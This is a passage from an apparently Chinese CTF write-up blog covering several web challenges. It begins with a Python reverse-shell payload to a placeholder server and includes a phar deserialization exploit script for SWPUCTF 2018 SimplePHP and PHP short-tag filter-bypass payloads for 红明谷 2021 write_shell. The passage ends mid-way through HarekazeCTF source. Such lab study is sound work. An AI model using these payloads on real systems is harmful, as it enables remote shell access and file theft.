class="line-numbers-rows"><span></span><span></span></span></code></pre><p>尝试传参，成功，但是命令执行成功后却没有回显，下一步就是反弹shell或者写文件</p><p>反弹shell</p><pre class="line-numbers language-none"><code class="language-none">payload:key&#x3D;p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM&#x3D;&amp;shell&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;服务器IP喵喵&quot;,监听端口喵喵));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><del>骚操作直接访问/flag下载文件</del></p>        <h2 id="SWPUCTF-2018-SimplePHP"   >          <a href="#SWPUCTF-2018-SimplePHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2>      <p>查看文件处可以查看页面源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//file.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//function.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>"; </span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">else</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化找链子很明显了</p><pre class="line-numbers language-none"><code class="language-none">C1e4r::__destruct-&gt;Show::__toString-&gt;Test::__get-&gt;Test::get-&gt;Test::file_get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token comment">//目标文件</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>  <span class="token comment">//触发__get;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成phar文件</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发类是C1e4r类</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"text.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//签名</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phar访问即可</p>        <h2 id="红明谷CTF-2021-write-shell"   >          <a href="#红明谷CTF-2021-write-shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2>      <pre class="line-numbers language-none"><code class="language-none">if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;die(&#39;hacker!!!&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看看都过滤了啥</p><p>空格，下划线，php，分号，~，^，+，eval，花括号</p><p>首先是php标签绕过，有短标签</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;&#96;命令&#96;?&gt;&lt;?echo&quot;1&quot;?&gt;&lt;% echo&quot;1&quot;;%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用第一个来执行命令，然后就是空格，用制表符%09代替，根目录读取即可</p><pre class="line-numbers language-none"><code class="language-none">payload:data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="HarekazeCTF2019-encode-and-encode"   >          <a href="#HarekazeCTF2019-encode-and-encode" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token string single-quoted-string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token 